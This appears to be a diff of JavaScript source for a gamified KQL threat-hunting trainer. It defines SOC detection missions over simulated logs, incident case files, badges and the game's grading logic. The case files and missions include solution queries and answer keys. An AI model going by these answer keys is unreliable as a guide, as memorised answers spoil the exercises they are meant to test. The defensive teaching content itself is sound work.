+    steps: [{ objective: 'Find the remote domain contacted by powershell.exe on the compromised device.', concepts: ['where'], xp: 300, solutionQuery: `DeviceNetworkEvents | where InitiatingProcessFileName == "powershell.exe" | distinct RemoteUrl`, hints: ['Filter to connections initiated by powershell.exe, then get the unique destination.'] }],
+  },
+  {
+    id: 'NF05', level: 7, campaign: 'nightfall', title: 'Operation Nightfall — Stage 5', codename: 'DIGGING IN', boss: true, dataset: 'DeviceProcessEvents',
+    intro: `Stage 5: an attacker with C2 access rarely stops at one machine. First they make sure they can survive a reboot.`,
+    steps: [{ objective: 'Find the schtasks.exe event that created a new scheduled task.', concepts: ['where', 'LOLBins'], xp: 300, solutionQuery: `DeviceProcessEvents | where FileName == "schtasks.exe" and ProcessCommandLine contains "/create"`, hints: ['You solved this exact pattern earlier in your training.'] }],
+  },
+  {
+    id: 'NF06', level: 7, campaign: 'nightfall', title: 'Operation Nightfall — Final Stage', codename: 'THE FINAL TIMELINE', boss: true, dataset: 'DeviceProcessEvents + DeviceNetworkEvents + DeviceFileEvents',
+    intro: `☠️ FINAL STAGE\n\nYou have every piece. Now build the artifact every incident commander needs — a unified timeline of everything that happened on the compromised endpoint.`,
+    steps: [{ objective: 'Union DeviceProcessEvents, DeviceNetworkEvents, and DeviceFileEvents for FIN-WKS-014, sorted chronologically.', concepts: ['union', 'synthesis'], xp: 1000, solutionQuery: `union DeviceProcessEvents, DeviceNetworkEvents, DeviceFileEvents | where DeviceName == "FIN-WKS-014" | sort by TimeGenerated asc`, hints: ['You need rows from three tables stacked together — union, not join.', 'Try: `union DeviceProcessEvents, DeviceNetworkEvents, DeviceFileEvents | where DeviceName == "FIN-WKS-014" | sort by TimeGenerated asc`'], badge: 'nightfall_survivor', explainNote: 'This is what a real incident timeline looks like — every log source, one device, one chronological story.' }],
+  },
+];
+
+const ALL_MODULES = [...MODULES, ...NIGHTFALL_MODULES];
+
+// Flatten into individually-addressable steps for progress tracking, while keeping
+// module metadata attached to each one (for the step-tracker UI and query carry-over).
+const ALL_STEPS = [];
+ALL_MODULES.forEach((m) => {
+  m.steps.forEach((s, i) => {
+    ALL_STEPS.push(Object.assign({}, s, {
+      id: `${m.id}_S${i + 1}`,
+      moduleId: m.id,
+      moduleTitle: m.title,
+      moduleCodename: m.codename,
+      moduleIntro: m.intro,
+      level: m.level,
+      dataset: m.dataset,
+      campaign: m.campaign || null,
+      boss: !!(m.boss || s.boss),
+      badge: s.badge || null,
+      stepIndex: i,
+      totalSteps: m.steps.length,
+      title: m.steps.length > 1 ? `${m.title} — Step ${i + 1}/${m.steps.length}` : m.title,
+    }));
+  });
+});
+
+// Review-mission templates: reusing the same datasets with a fresh scenario/threshold,
+// tagged by the concept they reinforce. Injected automatically when a concept is weak.
+const REVIEW_TEMPLATES = {
+  where: [
+    { title: 'Knowledge Check: Filtering', story: 'Before you continue, prove you\'ve mastered `where`. A new alert just came in.', objective: 'Find all sign-ins from Location "RU" regardless of result.', solutionQuery: `SigninLogs | where Location == "RU"`, hints: ['`where` filters rows by a condition.', 'Compare the Location column to "RU".', 'Try: `SigninLogs | where Location == "RU"`'] },
+  ],
+  summarize: [
+    { title: 'Knowledge Check: Summarize', story: 'Let\'s see if `summarize` has really sunk in.', objective: 'Count total sign-in events (success and failure) per AppDisplayName.', solutionQuery: `SigninLogs | summarize Total=count() by AppDisplayName | sort by Total desc`, hints: ['Group by AppDisplayName.', 'Use count() as your aggregate.', 'Try: `SigninLogs | summarize Total=count() by AppDisplayName | sort by Total desc`'] },
+  ],
+  join: [
+    { title: 'Knowledge Check: Joins', story: 'One more join, to make sure the concept has stuck.', objective: 'Join DeviceProcessEvents to DeviceNetworkEvents on DeviceName to see which processes correlate with network activity.', solutionQuery: `DeviceProcessEvents | join kind=inner (DeviceNetworkEvents) on DeviceName`, hints: ['`join kind=inner (Table) on Column` is the pattern.', 'DeviceName exists on both tables.', 'Try: `DeviceProcessEvents | join kind=inner (DeviceNetworkEvents) on DeviceName`'] },
+  ],
+  extend: [
+    { title: 'Knowledge Check: Extend', story: 'Quick refresher on adding computed columns.', objective: 'Add a column IsFailure that is true when ResultType != 0.', solutionQuery: `SigninLogs | extend IsFailure = ResultType != 0 | project UserPrincipalName, ResultType, IsFailure`, hints: ['`extend` adds a column without dropping others.', 'A comparison like `ResultType != 0` evaluates to true/false directly — no iff needed.', 'Try: `SigninLogs | extend IsFailure = ResultType != 0 | project UserPrincipalName, ResultType, IsFailure`'] },
+  ],
+  count: [
+    { title: 'Knowledge Check: Count', story: 'A quick gut-check on counting rows.', objective: 'Return the total number of DeviceProcessEvents rows where FileName is "powershell.exe".', solutionQuery: `DeviceProcessEvents | where FileName == "powershell.exe" | count`, hints: ['Filter first, then use `count` with no arguments as the last stage.', 'Try: `DeviceProcessEvents | where FileName == "powershell.exe" | count`'] },
+  ],
+  distinct: [
+    { title: 'Knowledge Check: Distinct', story: 'Make sure deduplication is second nature by now.', objective: 'Return the distinct list of DeviceName values in DeviceNetworkEvents.', solutionQuery: `DeviceNetworkEvents | distinct DeviceName`, hints: ['`distinct` removes duplicate rows for the column(s) you name.', 'Try: `DeviceNetworkEvents | distinct DeviceName`'] },
+  ],
+  contains: [
+    { title: 'Knowledge Check: Contains', story: 'One more substring check to lock this in.', objective: 'Find DeviceFileEvents rows where FolderPath contains "AppData".', solutionQuery: `DeviceFileEvents | where FolderPath contains "AppData"`, hints: ['`contains` is case-insensitive substring matching.', 'Try: `DeviceFileEvents | where FolderPath contains "AppData"`'] },
+  ],
+  'sort': [
+    { title: 'Knowledge Check: Sorting', story: 'Quick refresher on ordering results.', objective: 'Show all DeviceFileEvents sorted by TimeGenerated, newest first.', solutionQuery: `DeviceFileEvents | sort by TimeGenerated desc`, hints: ['`sort by Column desc` puts the newest/largest first.', 'Try: `DeviceFileEvents | sort by TimeGenerated desc`'] },
+  ],
+};
+REVIEW_TEMPLATES['order by'] = REVIEW_TEMPLATES['sort'];
+REVIEW_TEMPLATES['has'] = REVIEW_TEMPLATES['contains'];
+REVIEW_TEMPLATES['dcount'] = REVIEW_TEMPLATES['count'];
+REVIEW_TEMPLATES['countif'] = REVIEW_TEMPLATES['count'];
+
+// ============================================================
+// KQL QUEST — CASE FILES
+// Big, open-ended investigations. The analyst gets a KQL editor
+// and the full simulated environment, no guided steps or
+// solutionQuery grading — they must find their own evidence and
+// then write up the incident using the 5W1H framework:
+// Who / What / When / Where / Why / How.
+//
+// Grading is keyword/regex based (this is inherently free text),
+// tolerant of many reasonable phrasings, tuned against the actual
+// generated dataset in dataset.js.
+// ============================================================
+
+const CASE_FILES = [
+  {
+    id: 'CASE01',
+    title: 'The Nightwave Breach',
+    difficulty: 5,
+    xpPerQuestion: 120,
+    bonusXp: 400,
+    badge: 'case_closed',
+    datasets: ['SigninLogs', 'DeviceProcessEvents', 'DeviceNetworkEvents', 'DeviceFileEvents'],
+    briefing: `📁 CASE FILE — THE NIGHTWAVE BREACH\n\nThe SOC has closed out the technical timeline, but the incident commander needs a proper report before this goes to leadership and legal. You have full access to every log source. No guided steps this time — investigate however you see fit, then answer the six questions every incident report must answer.`,
+    startingTip: 'Try starting with: SigninLogs | where ResultType != 0 | summarize count() by UserPrincipalName',
+    questions: {
+      who: {
+        prompt: 'WHO was the compromised user account?',
+        mode: 'keywords',
+        accepted: ['jchen', 'jchen@nightwave.io'],
+        hint: 'Look for the account with an unusual pattern of many failed sign-ins followed by a success from an unexpected location.',
+        modelAnswer: 'jchen@nightwave.io',
+      },
+      what: {
+        prompt: 'WHAT happened, in a sentence — what kind of attack technique gave the attacker code execution?',
+        mode: 'keywords',
+        accepted: ['phishing', 'macro', 'powershell', 'malicious document', 'malicious attachment', 'docm', 'malware'],
+        hint: 'Check DeviceProcessEvents for a suspicious parent process launching another process on FIN-WKS-014.',
+        modelAnswer: 'A phishing email with a macro-enabled Word document (Invoice_Q3_Overdue.docm) launched an encoded PowerShell command.',
+      },
+      when: {
+        mode: 'regex',
+        prompt: 'WHEN did the intrusion begin, relative to now (e.g. "about 2 hours ago")?',
+        pattern: '\\d+(\\.\\d+)?\\s*(h|hr|hrs|hour|hours)',
+        hint: 'Look at the earliest suspicious SigninLogs timestamp for jchen and compare it to the current time.',
+        modelAnswer: 'Approximately 2–3 hours before the investigation began.',
+      },
+      where: {
+        prompt: 'WHERE did the attack originate (source IP and/or location), and which internal host was compromised?',
+        mode: 'keywords',
+        accepted: ['185.220.101.47', 'russia', 'ru', 'fin-wks-014'],
+        hint: 'Check the IPAddress and Location fields on the successful sign-in, and DeviceName on the malicious process events.',
+        modelAnswer: 'From IP 185.220.101.47 (Russia), landing on workstation FIN-WKS-014.',
+      },
+      why: {
+        prompt: 'WHY did the attacker create a scheduled task on the compromised host?',
+        mode: 'keywords',
+        accepted: ['persist', 'reboot', 'maintain access', 'survive', 'stay', 're-launch', 'relaunch'],
+        hint: 'Scheduled tasks that re-run a script every few minutes are a classic way to keep access after a reboot or process kill.',
+        modelAnswer: 'To establish persistence — the scheduled task re-launches the malicious script every 5 minutes so the attacker survives a reboot or process kill.',
+      },
+      how: {
+        prompt: 'HOW did the attacker move from the initial workstation to another machine?',
+        mode: 'keywords',
+        accepted: ['psexec', 'lateral', 'fin-srv-02', 'remote exec', 'remote execution'],
+        hint: 'Look for a remote-execution tool in DeviceProcessEvents launched from the compromised workstation.',
+        modelAnswer: 'Using PsExec64.exe for lateral movement from FIN-WKS-014 to FIN-SRV-02.',
+      },
+    },
+  },
+  {
+    id: 'CASE02',
+    title: 'The Login Storm',
+    difficulty: 4,
+    xpPerQuestion: 100,
+    bonusXp: 300,
+    badge: null,
+    datasets: ['SigninLogs'],
+    briefing: `📁 CASE FILE — THE LOGIN STORM\n\nOvernight, five different employees received "unusual sign-in activity" notifications almost simultaneously. None of them were traveling or working late. Investigate the sign-in logs and write up what happened.`,
+    startingTip: 'Try starting with: SigninLogs | where ResultType != 0 | summarize count() by IPAddress',
+    questions: {
+      who: {
+        prompt: 'WHO was targeted — name at least one affected account, or describe the group.',
+        mode: 'keywords',
+        accepted: ['asmith', 'bwong', 'ktran', 'mgarcia', 'rpatel', 'multiple account', 'several account', 'five account', 'multiple user', 'several user'],
+        hint: 'Group failed sign-ins by UserPrincipalName — several distinct accounts were hit, not just one.',
+        modelAnswer: 'Five separate accounts: asmith, bwong, ktran, mgarcia, and rpatel.',
+      },
+      what: {
+        prompt: 'WHAT type of attack is this?',
+        mode: 'keywords',
+        accepted: ['password spray', 'password-spray', 'brute force', 'credential stuffing', 'credential access'],
+        hint: 'Many accounts, relatively few attempts each, all from one source — that combination has a name.',
+        modelAnswer: 'A password-spraying attack.',
+      },
+      when: {
+        mode: 'regex',
+        prompt: 'WHEN did the burst of activity happen, relative to now (e.g. "about 18 hours ago")?',
+        pattern: '\\d+(\\.\\d+)?\\s*(h|hr|hrs|hour|hours)',
+        hint: 'Bucket the failed attempts by 30-minute windows and see how long ago that window was.',
+        modelAnswer: 'Roughly 18 hours before the investigation began, inside a single 30-minute window.',
+      },
+      where: {
+        prompt: 'WHERE did the attack come from (source IP and/or location)?',
+        mode: 'keywords',
+        accepted: ['45.155.204.10', 'russia', 'ru'],
+        hint: 'Every one of these failed attempts shares the same source IP.',
+        modelAnswer: 'A single external IP, 45.155.204.10, geolocated to Russia.',
+      },
+      why: {
+        prompt: 'WHY would an attacker run this kind of attack — what are they after?',
+        mode: 'keywords',
+        accepted: ['credential', 'gain access', 'initial access', 'guess password', 'break in', 'compromise account'],
+        hint: 'The goal of hammering many accounts with a few common passwords each is to find at least one that works.',
+        modelAnswer: 'To gain initial access by guessing weak or reused passwords across many accounts, hoping at least one succeeds.',
+      },
+      how: {
+        prompt: 'HOW does this technique avoid detection compared to hammering one account repeatedly?',
+        mode: 'keywords',
+        accepted: ['spread', 'multiple account', 'few attempt', 'low and slow', 'avoid lockout', 'account lockout', 'distribut'],
+        hint: 'Think about why an attacker would spread attempts across accounts instead of brute-forcing one account many times.',
+        modelAnswer: 'By spreading only a handful of attempts across many accounts, no single account crosses the lockout threshold, helping the attack fly under the radar.',
+      },
+    },
+  },
+];
+
+// ============ LEVELING ============
+const RANKS = [
+  { level: 1, name: 'SOC Intern', xpToNext: 300 },
+  { level: 2, name: 'KQL Rookie', xpToNext: 500 },
+  { level: 3, name: 'Query Explorer', xpToNext: 800 },
+  { level: 4, name: 'SOC Analyst', xpToNext: 1100 },
+  { level: 5, name: 'Senior Analyst', xpToNext: 1500 },
+  { level: 6, name: 'Threat Hunter', xpToNext: 2000 },
+  { level: 7, name: 'Advanced Hunter', xpToNext: 2600 },
+  { level: 8, name: 'KQL Specialist', xpToNext: 3300 },
+  { level: 9, name: 'Elite Hunter', xpToNext: 4200 },
+  { level: 10, name: 'KQL Master', xpToNext: Infinity },
+];
+
+function levelForXp(totalXp) {
+  let remaining = totalXp;
+  for (const r of RANKS) {
+    if (remaining < r.xpToNext) return { ...r, xpIntoLevel: remaining, xpToNext: r.xpToNext };
+    remaining -= r.xpToNext;
+  }
+  const last = RANKS[RANKS.length - 1];
+  return { ...last, xpIntoLevel: remaining, xpToNext: Infinity };
+}
+
+// ============ BADGES ============
+const BADGES = [
+  { id: 'first_blood', name: 'First Blood', rarity: 'Common', tier: 'Beginner', desc: 'Complete your first KQL mission.', icon: '🩸' },
+  { id: 'filter_rookie', name: 'Filter Rookie', rarity: 'Common', tier: 'Beginner', desc: "Successfully use `where`.", icon: '🔍' },
+  { id: 'data_explorer', name: 'Data Explorer', rarity: 'Common', tier: 'Beginner', desc: "Successfully use `project`.", icon: '🗂️' },
+  { id: 'table_scout', name: 'Table Scout', rarity: 'Common', tier: 'Beginner', desc: 'Correctly identify the right table three times.', icon: '🧭' },
+  { id: 'no_hints_needed', name: 'Sharp Eye', rarity: 'Uncommon', tier: 'Beginner', desc: 'Complete a mission with zero hints.', icon: '👁️' },
+  { id: 'aggregation_apprentice', name: 'Aggregation Apprentice', rarity: 'Uncommon', tier: 'Intermediate', desc: 'Master `summarize`.', icon: '📊' },
+  { id: 'time_traveler', name: 'Time Traveler', rarity: 'Uncommon', tier: 'Intermediate', desc: 'Successfully perform time-based analysis.', icon: '⏱️' },
+  { id: 'string_ninja', name: 'String Ninja', rarity: 'Uncommon', tier: 'Intermediate', desc: 'Master KQL string operators.', icon: '🥷' },
+  { id: 'password_spray_slayer', name: 'Password Spray Slayer', rarity: 'Rare', tier: 'Intermediate', desc: 'Defeat the Password Sprayer boss.', icon: '🛡️' },
+  { id: 'join_master', name: 'Join Master', rarity: 'Rare', tier: 'Advanced', desc: 'Successfully use `join`.', icon: '🔗' },
+  { id: 'correlation_specialist', name: 'Correlation Specialist', rarity: 'Rare', tier: 'Advanced', desc: 'Correlate events across multiple datasets.', icon: '🕸️' },
+  { id: 'impossible_travel_hunter', name: 'Impossible Traveler', rarity: 'Epic', tier: 'Advanced', desc: 'Defeat the Impossible Travel boss.', icon: '🌍' },
+  { id: 'threat_hunter_badge', name: 'Threat Hunter', rarity: 'Epic', tier: 'Advanced', desc: 'Complete a complex threat-hunting scenario.', icon: '🎯' },
+  { id: 'zero_hint_hunter', name: 'Zero Hint Hunter', rarity: 'Epic', tier: 'Elite', desc: 'Complete 5 missions without hints.', icon: '🧠' },
+  { id: 'streak_5', name: 'On a Roll', rarity: 'Uncommon', tier: 'Elite', desc: 'Reach a 5-mission streak.', icon: '🔥' },
+  { id: 'streak_10', name: 'Unstoppable', rarity: 'Rare', tier: 'Elite', desc: 'Reach a 10-mission streak.', icon: '🔥' },
+  { id: 'soc_legend', name: 'SOC Legend', rarity: 'Legendary', tier: 'Elite', desc: 'Complete the entire campaign.', icon: '🏆' },
+  { id: 'nightfall_survivor', name: 'Nightfall Survivor', rarity: 'Mythic', tier: 'Elite', desc: 'Complete Operation Nightfall.', icon: '☠️' },
+  { id: 'case_closed', name: 'Case Closed', rarity: 'Rare', tier: 'Elite', desc: 'Correctly answer every 5W1H question on a real-world case file.', icon: '🗂️' },
+  { id: 'master_investigator', name: 'Master Investigator', rarity: 'Legendary', tier: 'Elite', desc: 'Close every case file in the archive.', icon: '🕵️' },
+];
+
+const RARITY_COLOR = {
+  Common: '#8ea3b0', Uncommon: '#39ff88', Rare: '#3ec6ff', Epic: '#b76bff', Legendary: '#ffb347', Mythic: '#ff2ec4',
+};
+
+// ============================================================
+// KQL QUEST — application layer (state, rendering, game systems)
+// Depends on: runQuery, gradeResult, KqlError (engine.browser.js)
+//             buildDatabase (dataset.browser.js)
+//             ALL_STEPS, ALL_MODULES, REVIEW_TEMPLATES (challenges.browser.js)
+//             RANKS, levelForXp, BADGES, RARITY_COLOR (gamedata.browser.js)
+// ============================================================
+
+const SESSION_NOW = new Date();
+const DB = buildDatabase(SESSION_NOW, Date.now() % 100000);
+const TABLE_COLUMNS = {};
+Object.keys(DB).forEach(t => { TABLE_COLUMNS[t] = DB[t].length ? Object.keys(DB[t][0]).filter(k => k !== '__rid') : []; });
+
+const STORAGE_KEY = 'kqlquest_profile_v1';
+
+function freshPlayer() {
+  return {
+    name: '',
+    xp: 0,
+    streak: 0,
+    bestStreak: 0,
+    badges: [],
+    completed: {},        // id -> { attempts, hintsUsed, solutionRevealed, firstTry, xpEarned }
+    inProgress: {},        // id -> { attempts } for missions not yet solved
+    skillScores: {},      // concept -> { correct, total }
+    weakConcepts: [],
+    completedCount: 0,
+    reviewPool: [],        // queued synthetic review missions {id, concept, ...}
+    dailyDone: {},         // dateStr -> true
+    caseFiles: {},         // caseId -> { attempts, scoredKeys: [], xpEarned, solved }
+    createdAt: Date.now(),
+    lastActive: Date.now(),
+    activityLog: [],       // { ts, type, label, xp }
+    muted: false,
+  };
+}
+
+let state = {
+  player: null,
+  screen: 'loading',       // loading | onboarding | dashboard | mission | profile | badges | skilltree
+  currentId: null,         // challenge id or synthetic review id currently open
+  hintLevel: 0,
+  attemptResult: null,     // last grade result for current mission session
+  lastRunRows: null,
+  lastRunError: null,
+  showSolution: false,
+  queryHistory: {},        // challengeId -> [queries]
+  toast: null,             // { type, title, body }
+  levelUpFrom: null,
+  showResetConfirm: false,
+  currentCaseId: null,
+  caseLastRows: null,
+  caseLastError: null,
+  caseGrade: null,         // { who: bool, what: bool, ... } from the most recent submit
+  caseJustAwarded: null,   // { xp, newlyCorrect: [...] } for the success toast
+  caseShowAnswers: false,
+};
+
+// ---------------- persistence ----------------
+// Works two ways: inside a Claude.ai artifact, window.storage (async key-value API) is used.
+// Anywhere else — like a normal web host such as Vercel — it falls back to localStorage automatically.
+const HAS_ARTIFACT_STORAGE = typeof window !== 'undefined' && window.storage && typeof window.storage.get === 'function';
+
+async function loadPlayer() {
+  try {
+    if (HAS_ARTIFACT_STORAGE) {
+      const res = await window.storage.get(STORAGE_KEY, false);
+      if (res && res.value) return JSON.parse(res.value);
+      return null;
+    }
+    const raw = localStorage.getItem(STORAGE_KEY);
+    return raw ? JSON.parse(raw) : null;
+  } catch (e) { /* not found or storage unavailable */ }
+  return null;
+}
+async function savePlayer() {
+  try {
+    if (HAS_ARTIFACT_STORAGE) { await window.storage.set(STORAGE_KEY, JSON.stringify(state.player), false); }
+    else { localStorage.setItem(STORAGE_KEY, JSON.stringify(state.player)); }
+  } catch (e) { /* ignore */ }
+}
+async function resetProgress() {
+  state.player = freshPlayer();
+  state.currentId = null;
+  state.hintLevel = 0;
+  state.attemptResult = null;
+  state.lastRunRows = null;
+  state.lastRunError = null;
+  state.showSolution = false;
+  state._newBadges = null;
+  state.levelUpFrom = null;
+  state.queryHistory = {};
+  state._draftQuery = '';
+  state.showResetConfirm = false;
+  state.screen = 'onboarding';
+  await savePlayer();
+}
+
+// ---------------- helpers: campaign sequencing ----------------
+function allMissionsInOrder() {
+  return ALL_STEPS; // already curated in learning order, grouped by module, including boss stages
+}
+function isCompleted(id) { return !!(state.player.completed[id]); }
+
+function nextMissionId() {
+  // pending synthetic review missions take priority
+  if (state.player.reviewPool.length) return state.player.reviewPool[0].id;
+  for (const c of allMissionsInOrder()) {
+    if (!isCompleted(c.id)) return c.id;
+  }
+  return null; // campaign complete
+}
+function isUnlocked(id) {
+  const order = allMissionsInOrder();
+  const idx = order.findIndex(c => c.id === id);
+  if (idx <= 0) return true;
+  return isCompleted(order[idx - 1].id) || isCompleted(id);
+}
+function getChallengeById(id) {
+  const real = ALL_STEPS.find(c => c.id === id);
+  if (real) return real;
+  const synth = state.player.reviewPool.find(r => r.id === id);
+  return synth || null;
+}
+function stepsOfModule(moduleId) {
+  return ALL_STEPS.filter(s => s.moduleId === moduleId);
+}
+function moduleProgress(moduleId) {
+  const steps = stepsOfModule(moduleId);
+  const done = steps.filter(s => isCompleted(s.id)).length;
+  return { done, total: steps.length };
+}
+// The query the player last successfully submitted for a step — used to prefill
+// the editor on the NEXT step in the same module, so they extend it instead of
+// starting from a blank page.
+function priorQueryForStep(step) {
+  if (!step || step.review || step.stepIndex === 0) return '';
+  const prevId = `${step.moduleId}_S${step.stepIndex}`; // stepIndex is 0-based; previous step's 1-based suffix == current stepIndex
+  const prevRec = state.player.completed[prevId];
+  return (prevRec && prevRec.finalQuery) || '';
+}
+
+
+// ---------------- badge / level helpers ----------------
+function awardBadge(id) {
+  if (!id) return null;
+  if (state.player.badges.includes(id)) return null;
+  state.player.badges.push(id);
+  return BADGES.find(b => b.id === id) || null;
+}
+function xpMultiplierForStreak(streak) {
+  if (streak >= 10) return 1.5;
+  if (streak >= 5) return 1.25;
+  if (streak >= 3) return 1.1;
+  return 1;
+}
+function logActivity(type, label, xp) {
+  state.player.activityLog.unshift({ ts: Date.now(), type, label, xp: xp || 0 });
+  state.player.activityLog = state.player.activityLog.slice(0, 40);
+}
+
+// ---------------- grading / concept tracking ----------------
+function recordConceptResult(concepts, success) {
+  concepts.forEach(c => {
+    if (!state.player.skillScores[c]) state.player.skillScores[c] = { correct: 0, total: 0 };
+    state.player.skillScores[c].total++;
+    if (success) state.player.skillScores[c].correct++;
+  });
+}
+function conceptMastery(c) {
+  const s = state.player.skillScores[c];
+  if (!s || s.total === 0) return null;
+  return Math.round((s.correct / s.total) * 100);
+}
+function markWeak(concepts) {
+  concepts.forEach(c => {
+    if (!state.player.weakConcepts.includes(c)) state.player.weakConcepts.push(c);
+  });
+}
+function maybeQueueReview() {
+  if (state.player.weakConcepts.length === 0) return;
+  if (state.player.completedCount === 0 || state.player.completedCount % 5 !== 0) return;
+  const idx = state.player.weakConcepts.findIndex(c => REVIEW_TEMPLATES[c] && REVIEW_TEMPLATES[c].length);
+  if (idx === -1) return; // no reviewable concept queued yet; leave weakConcepts as-is for next checkpoint
+  const concept = state.player.weakConcepts.splice(idx, 1)[0];
+  const templates = REVIEW_TEMPLATES[concept];
+  const t = templates[Math.floor(Math.random() * templates.length)];
+  const synthId = `REVIEW_${concept}_${Date.now()}`;
+  state.player.reviewPool.push({
+    id: synthId, level: 0, review: true, title: t.title, moduleTitle: t.title, moduleCodename: 'REVIEW MISSION', moduleIntro: t.story,
+    difficulty: 2, xp: 75, concepts: [concept], dataset: 'Review', stepIndex: 0, totalSteps: 1, moduleId: synthId, boss: false,
+    story: t.story, objective: t.objective, thinkThrough: [],
+    solutionQuery: t.solutionQuery, hints: t.hints, explainNote: 'Review missions reinforce a concept you struggled with earlier — mastering it now prevents it from resurfacing later.',
+  });
+}
+
+// ---------------- KQL explain mode (template-based) ----------------
+function explainQuery(query) {
+  const stages = query.split('|').map(s => s.trim()).filter(Boolean);
+  return stages.map((stage, i) => {
+    let desc = 'A pipeline stage.';
+    const s = stage.toLowerCase();
+    if (i === 0 && !/^(where|project|extend|summarize|sort|order|take|limit|top|distinct|join|union|mv-expand|search|count|let)/.test(s)) {
+      desc = `Selects the ${stage} table as the starting data source.`;
+    } else if (/^where\b/.test(s)) desc = 'Filters rows — only rows where the condition is true continue down the pipeline.';
+    else if (/^project-away\b/.test(s)) desc = 'Removes the named columns, keeping everything else.';
+    else if (/^project-rename\b/.test(s)) desc = 'Renames columns without changing their values.';
+    else if (/^project\b/.test(s)) desc = 'Reshapes each row down to exactly the listed columns (and/or computed expressions), discarding the rest.';
+    else if (/^extend\b/.test(s)) desc = 'Adds a new computed column while keeping every existing column.';
+    else if (/^summarize\b/.test(s)) desc = /\bby\b/.test(s) ? 'Groups rows by the given column(s) and computes an aggregate (count, sum, avg, etc.) per group.' : 'Computes a single aggregate value across all rows.';
+    else if (/^distinct\b/.test(s)) desc = 'Removes duplicate rows, keeping only unique combinations of the listed columns.';
+    else if (/^(sort|order)\b/.test(s)) desc = 'Reorders the rows by the given column(s), ascending or descending.';
+    else if (/^top\b/.test(s)) desc = 'Sorts by a column and keeps only the top N rows — a shortcut for sort + take.';
+    else if (/^(take|limit)\b/.test(s)) desc = 'Keeps only the first N rows and discards the rest.';
+    else if (/^count\b/.test(s)) desc = 'Collapses the entire result down to a single row containing the row count.';
+    else if (/^search\b/.test(s)) desc = 'Scans every column of every row for a keyword, regardless of which field it appears in.';
+    else if (/^join\b/.test(s)) desc = 'Combines rows from this pipeline with rows from another table wherever the join key matches.';
+    else if (/^union\b/.test(s)) desc = 'Stacks rows from multiple tables into one result, even if their columns differ.';
+    else if (/^mv-expand\b/.test(s)) desc = 'Expands an array-valued column into one row per array element.';
+    else if (/^let\b/.test(s)) desc = 'Defines a reusable variable or sub-query for the rest of the statement.';
+    return { stage, desc };
+  });
+}
+
+// ---------------- Case Files: open-ended 5W1H investigations ----------------
+function getCaseById(id) { return CASE_FILES.find(c => c.id === id) || null; }
+function caseProgress(id) {
+  const rec = state.player.caseFiles[id];
+  const total = 6;
+  const scored = rec ? rec.scoredKeys.length : 0;
+  return { scored, total, solved: !!(rec && rec.solved) };
+}
+function gradeCaseQuestion(q, answerText) {
+  const text = (answerText || '').trim().toLowerCase();
+  if (!text) return false;
+  if (q.mode === 'regex') {
+    try { return new RegExp(q.pattern, 'i').test(text); } catch (e) { return false; }
+  }
+  return (q.accepted || []).some(kw => text.includes(kw.toLowerCase()));
+}
+function runCaseQuery(code) {
+  state.caseLastError = null;
+  state.caseLastRows = null;
+  try {
+    state.caseLastRows = runQuery(code, DB, SESSION_NOW);
+  } catch (e) {
+    state.caseLastError = e.message || String(e);
+  }
+}
+function submitCaseAnswers() {
+  const c = getCaseById(state.currentCaseId);
+  if (!c) return;
+  const answers = {};
+  Object.keys(c.questions).forEach(k => {
+    const el = document.getElementById(`case-answer-${k}`);
+    answers[k] = el ? el.value : '';
+  });
+  const rec = state.player.caseFiles[c.id] || { attempts: 0, scoredKeys: [], xpEarned: 0, solved: false, lastAnswers: {} };
+  rec.attempts++;
+  rec.lastAnswers = answers;
+  const grade = {};
+  const newlyCorrect = [];
+  let xpGained = 0;
+  Object.entries(c.questions).forEach(([k, q]) => {
+    const correct = gradeCaseQuestion(q, answers[k]);
+    grade[k] = correct;
+    if (correct && !rec.scoredKeys.includes(k)) {
+      rec.scoredKeys.push(k);
+      xpGained += c.xpPerQuestion;
+      newlyCorrect.push(k);
+    }
+  });
+  const newBadges = [];
+  if (rec.scoredKeys.length === 6 && !rec.solved) {
+    rec.solved = true;
+    xpGained += c.bonusXp;
+    logActivity('casefile', `Case Closed: ${c.title}`, xpGained);
+    if (c.badge) { const b = awardBadge(c.badge); if (b) newBadges.push(b); }
+    const allSolved = CASE_FILES.every(cf => cf.id === c.id ? true : (state.player.caseFiles[cf.id] && state.player.caseFiles[cf.id].solved));
+    if (allSolved) { const b = awardBadge('master_investigator'); if (b) newBadges.push(b); }
+  } else if (xpGained > 0) {
+    logActivity('casefile', `${c.title}: ${newlyCorrect.length} answer(s) confirmed`, xpGained);
+  }
+  rec.xpEarned = (rec.xpEarned || 0) + xpGained;
+  state.player.xp += xpGained;
+  state.player.caseFiles[c.id] = rec;
+  state.caseGrade = grade;
+  state._newBadges = newBadges.length ? newBadges : null;
+  savePlayer();
+}
+
+// ---------------- run a query for the current mission ----------------
+function runCurrentQuery(code) {
+  const challenge = getChallengeById(state.currentId);
+  state.lastRunError = null;
+  state.lastRunRows = null;
+  let expected;
+  try { expected = runQuery(challenge.solutionQuery, DB, SESSION_NOW); } catch (e) { expected = []; }
+  let userRows;
+  try {
+    userRows = runQuery(code, DB, SESSION_NOW);
+  } catch (e) {
+    state.lastRunError = e.message || String(e);
+    state.attemptResult = { status: 'error' };
+    return;
+  }
+  state.lastRunRows = userRows;
+  const grade = gradeResult(userRows, expected);
+  state.attemptResult = grade;
+}
+
+function submitMission() {
+  const code = document.getElementById('kql-editor').value;
+  (state.queryHistory[state.currentId] = state.queryHistory[state.currentId] || []).unshift(code);
+  const challenge = getChallengeById(state.currentId);
+  const progress = state.player.inProgress[state.currentId] || { attempts: 0 };
+  progress.attempts++;
+  state.player.inProgress[state.currentId] = progress;
+  const rec = state.player.completed[state.currentId] || { attempts: progress.attempts, hintsUsed: 0, solutionRevealed: false, firstTry: false, xpEarned: 0, finalQuery: '' };
+  rec.attempts = progress.attempts;
+  runCurrentQuery(code);
+
+  if (state.attemptResult.status === 'success') {
+    const alreadyDone = !!state.player.completed[state.currentId];
+    rec.firstTry = rec.attempts === 1 && state.hintLevel === 0 && !state.showSolution;
+    rec.hintsUsed = state.hintLevel;
+    rec.solutionRevealed = state.showSolution;
+    rec.finalQuery = code;
+    if (!alreadyDone) {
+      recordConceptResult(challenge.concepts || [], true);
+      let baseXp = challenge.xp;
+      if (rec.firstTry) baseXp += 50;
+      const hintPenalty = Math.max(0.4, 1 - state.hintLevel * 0.15);
+      const revealPenalty = state.showSolution ? 0.4 : 1;
+      const mult = xpMultiplierForStreak(state.player.streak + 1);
+      const finalXp = Math.round(baseXp * hintPenalty * revealPenalty * mult);
+      rec.xpEarned = finalXp;
+      state.player.xp += finalXp;
+      state.player.streak += 1;
